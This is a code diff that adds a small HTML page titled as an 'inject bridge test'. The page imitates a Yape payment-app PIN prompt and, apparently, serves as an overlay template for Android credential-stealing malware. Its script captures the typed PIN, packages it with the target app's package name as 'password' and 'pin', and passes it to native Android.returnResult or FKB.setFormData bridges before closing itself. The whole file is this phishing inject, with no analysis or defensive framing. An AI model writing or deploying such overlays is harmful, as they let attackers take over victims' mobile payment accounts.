@@ -1,0 +1,41 @@
+<!doctype html>
+<html lang="zh"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>inject bridge test</title>
+<style>
+ html,body{margin:0;height:100%;background:#0d1b2a;color:#e8eef7;font:16px/1.5 -apple-system,sans-serif}
+ .wrap{padding:28px}
+ h3{margin:0 0 18px;font-size:20px}
+ .row{margin:14px 0}
+ input{width:100%;height:52px;border-radius:12px;border:1px solid #2c4256;background:#122437;color:#e8eef7;padding:0 14px;font-size:18px;letter-spacing:6px}
+ button{width:100%;height:52px;margin-top:10px;border:0;border-radius:12px;background:#2f6bff;color:#fff;font-size:16px}
+ button.alt{background:#1f3b57}
+ #log{margin-top:16px;font-size:12px;color:#8fa6bd;white-space:pre-wrap}
+</style></head>
+<body><div class="wrap">
+  <h3>Yape · 输入 PIN（桥测试页）</h3>
+  <div class="row"><input id="pin" inputmode="numeric" maxlength="6" placeholder="••••••"></div>
+  <button onclick="viaAndroid()">提交（Android.returnResult）</button>
+  <button class="alt" onclick="viaFkb()">提交（FKB.setFormData）</button>
+  <div id="log"></div>
+</div>
+<script>
+function val(){return (document.getElementById('pin').value||'').trim();}
+function log(s){document.getElementById('log').textContent += s + '\n';}
+function payload(){
+  var pkg='';
+  try{ if(typeof FKB!=='undefined'&&FKB.getPkg) pkg=FKB.getPkg(); }catch(e){}
+  if(!pkg){ try{ if(typeof Android!=='undefined'&&Android.getPkg) pkg=Android.getPkg(); }catch(e){} }
+  return JSON.stringify({password:val(),pin:val(),pkg:pkg,template:'yape'});
+}
+function viaAndroid(){
+  var p=payload(); log('Android.returnResult '+p);
+  try{ Android.returnResult(p); }catch(e){ log('ERR '+e); }
+  setTimeout(function(){ try{Android.close();}catch(e){} },400);
+}
+function viaFkb(){
+  var p=payload(); log('FKB.setFormData '+p);
+  try{ FKB.setFormData(p); }catch(e){ log('ERR '+e); }
+  setTimeout(function(){ try{FKB.setClosePage(FKB.getPkg());}catch(e){} },400);
+}
+</script></body></html>
